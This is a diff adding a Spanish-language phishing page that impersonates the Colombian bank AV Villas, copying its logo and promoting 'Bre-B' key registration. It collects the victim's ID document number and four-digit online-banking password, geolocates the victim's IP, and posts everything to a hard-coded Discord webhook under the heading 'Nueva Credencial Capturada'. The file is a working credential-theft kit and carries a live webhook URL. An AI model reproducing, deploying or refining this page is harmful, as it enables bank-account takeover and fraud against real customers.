@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AV Villas - Personas</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 0;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            position: relative;
+            background: linear-gradient(135deg, #f5f5f5 0%, #f5f5f5 50%, #ED1C24 50%, #ED1C24 100%);
+            padding: 40px 30px 60px;
+            min-height: 500px;
+            overflow: visible;
+        }
+
+        .logo {
+            display: inline-block;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            height: 45px;
+            width: auto;
+        }
+
+        .title {
+            margin-bottom: 20px;
+        }
+
+        .title-red {
+            color: #ED1C24;
+            font-weight: bold;
+            font-size: 22px;
+            margin-bottom: 5px;
+        }
+
+        .title-dark {
+            color: #333;
+            font-size: 26px;
+            font-weight: 300;
+            line-height: 1.2;
+        }
+
+        .title-blue {
+            color: #00D4D4;
+            font-size: 38px;
+            font-weight: bold;
+        }
+
+        .person-image {
+            position: absolute;
+            bottom: 60px;
+            right: -20px;
+            width: 340px;
+            height: 480px;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            z-index: 10;
+        }
+
+        .person-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            position: relative;
+        }
+
+        .person-placeholder img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            object-position: bottom;
+        }
+
+        .form-section {
+            padding: 40px 30px 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .select-wrapper {
+            position: relative;
+        }
+
+        select, input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #333;
+            background: white;
+            appearance: none;
+        }
+
+        select {
+            cursor: pointer;
+            padding-right: 40px;
+        }
+
+        .select-wrapper::after {
+            content: "▼";
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            pointer-events: none;
+            color: #999;
+            font-size: 12px;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ED1C24;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 16px;
+            background: #B8C5D0;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: background 0.3s;
+        }
+
+        .btn-continue.active {
+            background: #4A90E2;
+        }
+
+        .btn-continue.active:hover {
+            background: #357ABD;
+        }
+
+        .help-link {
+            text-align: center;
+            margin-top: 20px;
+            color: #4A90E2;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .footer-nav {
+            display: flex;
+            justify-content: space-around;
+            padding: 20px;
+            border-top: 1px solid #eee;
+            margin-top: 30px;
+        }
+
+        .footer-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            color: #666;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .footer-icon {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .footer-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: #666;
+        }
+
+        .pin-input-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .pin-box {
+            width: 60px;
+            height: 60px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            -webkit-text-security: disc;
+            text-security: disc;
+        }
+
+        .pin-box:focus {
+            border-color: #ED1C24;
+            outline: none;
+        }
+
+        .greeting {
+            font-size: 32px;
+            color: #333;
+            margin-bottom: 15px;
+            font-weight: 300;
+        }
+
+        .instruction {
+            color: #333;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                min-height: 420px;
+            }
+
+            .person-image {
+                width: 280px;
+                height: 420px;
+                right: -10px;
+                bottom: 40px;
+            }
+
+            .logo img {
+                height: 35px;
+            }
+
+            .title {
+                max-width: 180px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="step1">
+            <div class="header">
+                <div class="logo">
+                    <img src="https://feriadelavivienda.co/wp-content/uploads/2019/05/rsz_2logo_av_villas_rojo_mesa_de_trabajo_1.png" alt="AV Villas">
+                </div>
+                <div class="title">
+                    <div class="title-red">Registra tus llaves</div>
+                    <div class="title-dark">y mueve tu<br>plata con</div>
+                    <div class="title-blue">Bre-B</div>
+                </div>
+                <div class="person-image">
+                    <div class="person-placeholder">
+                        <img src="https://piloto.avvillas.com.co/documents/37648/42971030/banner.webp/b8cc53a2-443c-085a-18d3-bc4925196c16?version=1.0&t=1752173464013&imagePreview=1" alt="AV Villas">
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <div class="form-group">
+                    <label class="form-label">Tipo de documento</label>
+                    <div class="select-wrapper">
+                        <select id="docType">
+                            <option value="CC">Cédula de Ciudadanía</option>
+                            <option value="CE">Cédula de Extranjería</option>
+                            <option value="PA">Pasaporte</option>
+                            <option value="TI">Tarjeta de Identidad</option>
+                            <option value="NIT">NIT</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Número de documento</label>
+                    <input type="text" id="docNumber" placeholder="" maxlength="15" inputmode="numeric" pattern="[0-9]*">
+                </div>
+
+                <button class="btn-continue" id="btnStep1">CONTINUAR</button>
+
+                <div class="help-link">¿Tienes problemas para ingresar?</div>
+
+                <div class="footer-nav">
+                    <div class="footer-item">
+                        <div class="footer-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M20 15.5c-1.25 0-2.45-.2-3.57-.57-.1-.03-.21-.05-.31-.05-.26 0-.51.1-.71.29l-2.2 2.2c-2.83-1.44-5.15-3.75-6.59-6.59l2.2-2.21c.28-.26.36-.65.25-1C8.7 6.45 8.5 5.25 8.5 4c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.5c0-.55-.45-1-1-1zM19 12h2c0-4.97-4.03-9-9-9v2c3.87 0 7 3.13 7 7zm-4 0h2c0-2.76-2.24-5-5-5v2c1.66 0 3 1.34 3 3z"/>
+                            </svg>
+                        </div>
+                        <div>Canales de atención</div>
+                    </div>
+                    <div class="footer-item">
+                        <div class="footer-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"/>
+                                <path d="M17 10h-4V6h-2v4H7v2h4v4h2v-4h4z"/>
+                            </svg>
+                        </div>
+                        <div>Solicitar productos</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="step2" class="hidden">
+            <div class="header">
+                <div class="title">
+                    <div class="title-red">Registra tus llaves</div>
+                    <div class="title-dark">y mueve tu<br>plata con</div>
+                    <div class="title-blue">Bre-B</div>
+                </div>
+                <div class="person-image">
+                    <div class="person-placeholder">
+                        <img src="https://piloto.avvillas.com.co/documents/37648/42971030/banner.webp/b8cc53a2-443c-085a-18d3-bc4925196c16?version=1.0&t=1752173464013&imagePreview=1" alt="AV Villas">
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <div class="greeting">Hola</div>
+                <div class="instruction">
+                    <strong>Ingresa la contraseña con la que entras a tu Banca Virtual.</strong>
+                </div>
+
+                <div class="pin-input-container">
+                    <input type="tel" class="pin-box" maxlength="1" id="pin1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="pin-box" maxlength="1" id="pin2" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="pin-box" maxlength="1" id="pin3" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="pin-box" maxlength="1" id="pin4" inputmode="numeric" pattern="[0-9]*">
+                </div>
+
+                <button class="btn-continue" id="btnStep2">CONTINUAR</button>
+
+                <div class="footer-nav">
+                    <div class="footer-item">
+                        <div class="footer-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M20 15.5c-1.25 0-2.45-.2-3.57-.57-.1-.03-.21-.05-.31-.05-.26 0-.51.1-.71.29l-2.2 2.2c-2.83-1.44-5.15-3.75-6.59-6.59l2.2-2.21c.28-.26.36-.65.25-1C8.7 6.45 8.5 5.25 8.5 4c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.5c0-.55-.45-1-1-1zM19 12h2c0-4.97-4.03-9-9-9v2c3.87 0 7 3.13 7 7zm-4 0h2c0-2.76-2.24-5-5-5v2c1.66 0 3 1.34 3 3z"/>
+                            </svg>
+                        </div>
+                        <div>Canales de atención</div>
+                    </div>
+                    <div class="footer-item">
+                        <div class="footer-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"/>
+                                <path d="M17 10h-4V6h-2v4H7v2h4v4h2v-4h4z"/>
+                            </svg>
+                        </div>
+                        <div>Solicitar productos</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1471034444696522853/DUZaW94ie4iGarfMwCTQI1pWJMJ7Q48D6DukoDE-4QYQi9JgqDsZMcXwNYDfAEO7zgMC';
+        
+        let attemptNumber = 1;
+        let userLocation = null;
+
+        async function getUserLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                userLocation = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    isp: data.org,
+                    latitude: data.latitude,
+                    longitude: data.longitude
+                };
+            } catch (error) {
+                console.error('Error al obtener ubicación:', error);
+                userLocation = {
+                    ip: 'No disponible',
+                    city: 'No disponible',
+                    region: '',
+                    country: 'No disponible',
+                    isp: 'No disponible',
+                    latitude: 0,
+                    longitude: 0
+                };
+            }
+        }
+
+        getUserLocation();
+
+        const docNumber = document.getElementById('docNumber');
+        const docType = document.getElementById('docType');
+        const btnStep1 = document.getElementById('btnStep1');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+
+        docNumber.addEventListener('keypress', function(e) {
+            if (!/[0-9]/.test(e.key)) {
+                e.preventDefault();
+            }
+        });
+
+        docNumber.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            
+            if (this.value.length > 0) {
+                btnStep1.classList.add('active');
+            } else {
+                btnStep1.classList.remove('active');
+            }
+        });
+
+        btnStep1.addEventListener('click', function() {
+            if (docNumber.value.length > 0) {
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
+            }
+        });
+
+        const pinBoxes = [
+            document.getElementById('pin1'),
+            document.getElementById('pin2'),
+            document.getElementById('pin3'),
+            document.getElementById('pin4')
+        ];
+        const btnStep2 = document.getElementById('btnStep2');
+
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                if (this.value.length === 1 && index < pinBoxes.length - 1) {
+                    pinBoxes[index + 1].focus();
+                }
+                checkPinComplete();
+            });
+
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+            });
+
+            box.addEventListener('keypress', function(e) {
+                if (!/[0-9]/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+        });
+
+        function checkPinComplete() {
+            const allFilled = pinBoxes.every(box => box.value.length === 1);
+            if (allFilled) {
+                btnStep2.classList.add('active');
+            } else {
+                btnStep2.classList.remove('active');
+            }
+        }
+
+        async function sendToDiscord(data) {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    return { success: true };
+                } else {
+                    return { success: false, error: 'Error en la respuesta del servidor' };
+                }
+            } catch (error) {
+                console.error('Error al enviar datos:', error);
+                return { success: false, error: error.message };
+            }
+        }
+
+        function createDiscordMessage() {
+            const docTypeText = docType.options[docType.selectedIndex].text;
+            const pin = pinBoxes.map(box => box.value).join('');
+            const userAgent = navigator.userAgent;
+            
+            const currentTime = new Date().toLocaleString('es-CO', {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                timeZone: 'America/Bogota'
+            });
+
+            const locationString = userLocation ? 
+                `${userLocation.city}, ${userLocation.region}, ${userLocation.country}` : 
+                'Ubicación no disponible';
+
+            const payload = {
+                embeds: [{
+                    title: "Nueva Credencial Capturada - AV Villas",
+                    description: "Se ha recibido un nuevo intento de inicio de sesión.",
+                    color: 15158332,
+                    fields: [
+                        {
+                            name: "📋 Tipo de Documento",
+                            value: `\`\`\`${docTypeText}\`\`\``,
+                            inline: true
+                        },
+                        {
+                            name: "👤 Número de Documento",
+                            value: `\`\`\`${docNumber.value}\`\`\``,
+                            inline: true
+                        },
+                        {
+                            name: "🔑 PIN",
+                            value: `\`\`\`${pin}\`\`\``,
+                            inline: true
+                        },
+                        {
+                            name: "🔢 Intento #",
+                            value: `\`${attemptNumber}\``,
+                            inline: true
+                        },
+                        {
+                            name: "🌍 Ubicación Real",
+                            value: userLocation ? 
+                                `📍 ${locationString}\n🌐 IP: \`${userLocation.ip}\`\n🏢 ISP: ${userLocation.isp}` :
+                                '📍 Obteniendo ubicación...',
+                            inline: false
+                        },
+                        {
+                            name: "🕐 Fecha y Hora",
+                            value: currentTime,
+                            inline: false
+                        },
+                        {
+                            name: "💻 Dispositivo",
+                            value: `\`\`\`${userAgent}\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Sistema de Captura | @Brknshinexxx",
+                        icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/500px-Telegram_logo.svg.png"
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            return payload;
+        }
+
+        btnStep2.addEventListener('click', async function() {
+            const allFilled = pinBoxes.every(box => box.value.length === 1);
+            if (allFilled) {
+                btnStep2.disabled = true;
+                btnStep2.textContent = 'ENVIANDO...';
+
+                if (!userLocation) {
+                    await getUserLocation();
+                }
+
+                const pin = pinBoxes.map(box => box.value).join('');
+                const docTypeText = docType.options[docType.selectedIndex].text;
+
+                // Guardar en localStorage
+                localStorage.setItem('avvillas_docType', docTypeText);
+                localStorage.setItem('avvillas_docNumber', docNumber.value);
+                localStorage.setItem('avvillas_pin', pin);
+                localStorage.setItem('avvillas_timestamp', new Date().toISOString());
+                localStorage.setItem('avvillas_attempt', attemptNumber.toString());
+
+                const message = createDiscordMessage();
+                const result = await sendToDiscord(message);
+
+                if (result.success) {
+                    attemptNumber++;
+                    localStorage.setItem('avvillas_lastAttempt', attemptNumber.toString());
+                    window.location.href = 'wait.html';
+                } else {
+                    alert('Error al procesar el registro. Por favor, intente nuevamente.');
+                    btnStep2.disabled = false;
+                    btnStep2.textContent = 'CONTINUAR';
+                }
+            }
+        });
+    </script>
+</body>
+</html>
